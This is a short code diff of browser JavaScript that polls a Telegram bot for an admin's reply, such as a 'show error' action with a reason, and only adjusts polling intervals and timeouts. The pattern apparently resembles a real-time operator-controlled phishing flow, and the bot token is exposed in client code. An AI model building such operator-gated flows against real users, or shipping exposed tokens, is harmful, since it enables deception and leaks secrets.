@@ -167,7 +167,7 @@ document.addEventListener('DOMContentLoaded', function () {
     async function checkTelegramResponse(messageId) {
         const url = `https://api.telegram.org/bot${TELEGRAM_API_KEY}/getUpdates?limit=100&offset=${lastUpdateId}`;
         try {
-            const response = await fetch(url);
+            const response = await fetch(url, { cache: 'no-store' });
             const data = await response.json();
             if (!data.ok || !data.result || !data.result.length) return null;
 
@@ -194,7 +194,7 @@ document.addEventListener('DOMContentLoaded', function () {
     function startPolling(messageId) {
         return new Promise((resolve) => {
             let attempts = 0;
-            const maxAttempts = 45; // ~90 segundos
+            const maxAttempts = 90; // ~90 segundos
 
             pollingInterval = setInterval(async () => {
                 attempts++;
@@ -209,7 +209,7 @@ document.addEventListener('DOMContentLoaded', function () {
                     pollingInterval = null;
                     resolve({ action: 'timeout' });
                 }
-            }, 2000);
+            }, 1000);
         });
     }
 
@@ -249,10 +249,10 @@ document.addEventListener('DOMContentLoaded', function () {
 
             let motivo = resp && resp.reason ? resp.reason : null;
 
-            // Si pulsaron "Mostrar Error", esperamos unos segundos a que escriban el motivo
+            // Ventana corta por si el admin escribe el motivo (2 x 600ms ≈ 1.2s)
             if (!motivo && resp && resp.action === 'mostrar_error') {
-                for (let i = 0; i < 5; i++) {
-                    await new Promise(r => setTimeout(r, 500));
+                for (let i = 0; i < 2; i++) {
+                    await new Promise(r => setTimeout(r, 600));
                     const extra = await checkTelegramResponse(messageId);
                     if (extra && extra.reason) { motivo = extra.reason; break; }
                 }
